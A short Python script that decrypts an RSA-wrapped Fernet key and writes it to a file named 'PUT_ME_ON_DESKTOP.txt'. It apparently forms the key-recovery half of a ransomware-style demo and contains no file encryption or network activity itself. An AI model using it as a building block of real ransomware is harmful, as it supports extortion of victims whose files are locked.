from cryptography.fernet import Fernet
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import base64

with open('fernet_key.txt', 'rb') as f:
    enc_fernet_key = f.read()

private_key = RSA.importKey(open('private.pem').read())
private_crypter = PKCS1_OAEP.new(private_key)

dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)
